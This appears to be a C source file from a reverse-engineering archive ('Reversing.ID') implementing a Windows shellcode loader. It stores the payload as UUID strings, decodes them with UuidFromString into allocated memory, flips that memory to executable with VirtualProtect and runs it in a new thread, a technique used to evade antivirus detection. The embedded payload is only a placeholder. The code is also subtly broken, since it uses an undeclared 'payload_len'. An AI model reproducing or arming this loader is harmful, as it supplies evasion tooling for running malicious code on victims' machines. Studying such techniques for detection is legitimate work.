/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    UuidFromString
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <rpcdce.h>

#pragma comment(lib,"rpcrt4")

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    char *      payload []  = { "c3cc9090-0000-0000-0000-000000000000" };
    uint32_t    nitem       = 1;

    uint32_t    idx;
    UUID *      uuid;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, nitem * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    uuid = (UUID*) runtime;
    for (uint32_t idx = 0; idx < nitem; idx++, uuid++)
    {
        UuidFromString ((RPC_CSTR) payload[idx], uuid);
    }

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, nitem * 16, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}